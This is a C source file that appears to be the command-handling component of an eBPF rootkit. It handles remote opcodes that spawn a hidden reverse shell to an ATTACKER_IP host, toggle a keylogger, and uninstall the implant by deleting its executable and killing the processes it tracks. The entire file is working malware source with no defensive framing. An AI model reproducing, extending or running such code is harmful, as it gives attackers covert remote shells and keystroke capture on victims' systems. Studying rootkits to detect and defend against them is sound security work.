#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include "config.h"
#include "rootkit.skel.h"
#include "userspace/command_processor.h"
#include "userspace/loader.h"
#include "userspace/reverse_shell.h"

/**
 * @brief Kill all tracked PIDs from eBPF map
 * except self process.
 *
 * @param tracked_pids_map_fd
 */
static void kill_all_tracked_pids(int tracked_pids_map_fd) {
    pid_t pid;
    pid_t next_pid;

    int ret = bpf_map_get_next_key(tracked_pids_map_fd, NULL, &next_pid);

    while (ret == 0) {
        pid = next_pid;

        if (pid != getpid())
            kill(pid, SIGKILL);

        ret = bpf_map_get_next_key(tracked_pids_map_fd, &pid, &next_pid);
    }
}

/**
 * @brief Kill revese shell process.
 *
 * @param command_processor_ctx
 */
static void remove_reverse_shell(command_processor_context_t *command_processor_ctx) {
    if (!command_processor_ctx)
        return;

    if (*(command_processor_ctx->reverse_shell_pid) > 0) {
        kill(*(command_processor_ctx->reverse_shell_pid), SIGKILL);
        *(command_processor_ctx->reverse_shell_pid) = -1;
    }
}

static int keylogger_start(command_processor_context_t *command_processor_ctx) {
    if (!command_processor_ctx)
        return -EINVAL;

    *(command_processor_ctx->keylogger_active) = true;
    return 0;
}

static int keylogger_stop(command_processor_context_t *command_processor_ctx) {
    if (!command_processor_ctx)
        return -EINVAL;

    *(command_processor_ctx->keylogger_active) = false;
    return 0;
}

static void uninstall(command_processor_context_t *command_processor_ctx) {
    if (!command_processor_ctx)
        return;

    /* Deleting executable */
    unlink(command_processor_ctx->executable_name);

    kill_all_tracked_pids(command_processor_ctx->tracked_pids_map_fd);
    *(command_processor_ctx->rootkit_running) = false;
}

/**
 * @brief Spawn a reverse shell.
 *
 * PID of the reverse shell will automatically be hidden
 * together with every child process of it.
 *
 * @param command_processor_ctx
 * @return int
 */
static int spawn_reverse_shell(command_processor_context_t *command_processor_ctx) {
    if (!command_processor_ctx)
        return -EINVAL;

    pid_t pid = fork();
    if (pid < 0) {
        int err = errno;
        return -err;
    }

    if (pid == 0) {
        reverse_shell_start(ATTACKER_IP, REVERSE_SHELL_PORT);
        _exit(EXIT_FAILURE);
    }

    *(command_processor_ctx->reverse_shell_pid) = pid;

    return 0;
}

int command_processor_handle_received_command(void *ctx, void *data, size_t data_sz) {
    (void)ctx;
    (void)data_sz;

    if (!ctx || !data)
        return -EINVAL;

    command_processor_context_t *command_processor_ctx = (command_processor_context_t *)ctx;

    event_t *event = (event_t *)data;

    switch (event->command_opcode) {
    case COMMAND_REVERSE_SHELL_START:
        if (*(command_processor_ctx->reverse_shell_pid) == -1)
            spawn_reverse_shell(command_processor_ctx);
        break;
    case COMMAND_REVERSE_SHELL_STOP:
        remove_reverse_shell(command_processor_ctx);
        break;
    case COMMAND_KEYLOGGER_START:
        keylogger_start(command_processor_ctx);
        break;
    case COMMAND_KEYLOGGER_STOP:
        keylogger_stop(command_processor_ctx);
        break;
    case COMMAND_UNINSTALL:;
        uninstall(command_processor_ctx);
        break;
    default:
        break;
    }

    return 0;
}
